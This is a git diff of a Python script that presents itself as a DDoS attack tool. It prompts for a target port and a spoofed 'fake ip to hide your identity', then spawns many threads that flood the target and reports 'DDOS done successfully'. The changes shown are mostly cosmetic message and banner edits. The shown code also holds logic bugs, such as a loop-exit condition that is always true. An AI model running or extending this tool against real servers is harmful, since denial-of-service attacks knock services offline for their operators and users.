@@ -1,7 +1,7 @@
 import os,pyfiglet,random
 import threading
 import socket
-from time import sleep
+import time
 black='\033[30m'
 red='\033[31m'
 green='\033[32m'
@@ -39,9 +39,9 @@ while cont!= "n" and "no":
         port = int(input(f"{ran4}Enter port number [default port is 80]: "))
     except ValueError:
         port = 80
-        print(f"{ran3}Port 80 is selected ")
+        print(f"{ran3} Port 80 is selected ")
     else:
-        print(f"{ran}{port} is selected! ")
+        print(f"{ran}port {port} is selected! ")
 
     fake_ip = input(f"{ran}Type fake ip to hide your identity: ")
 
@@ -64,7 +64,7 @@ while cont!= "n" and "no":
             print(f"{ran}Have a Good Day :-)")
             
         except TimeoutError:
-            print("Server time out! Try again")
+            print("Requests sent successfully\n\nServer timed out!!!!")
             
         except ConnectionRefusedError:
             print(ran,"You've typed wrong ip address")
@@ -76,7 +76,7 @@ while cont!= "n" and "no":
     os.system("clear")
     print(lightblue , "Changing Your ip to:",fake_ip)
     print(cyan , "Connecting to port! ")
-    os.system("figlet Attack Starting")
+    print(pyfiglet.figlet_format("Attack\nStarting"))
 
     for i in range(range_of_req):
         thr = threading.Thread(target=ddos)
@@ -95,6 +95,11 @@ while cont!= "n" and "no":
 
     print(f"{ran4}\n\n\r[+] DDOS done successfully! \n\n")
     cont = input(f"{ran4}[-]Do You want to continue? [y/n]: ").lower
+
+    if cont == "n" or "no":
+        break
+    else:
+        pass
 
     
 
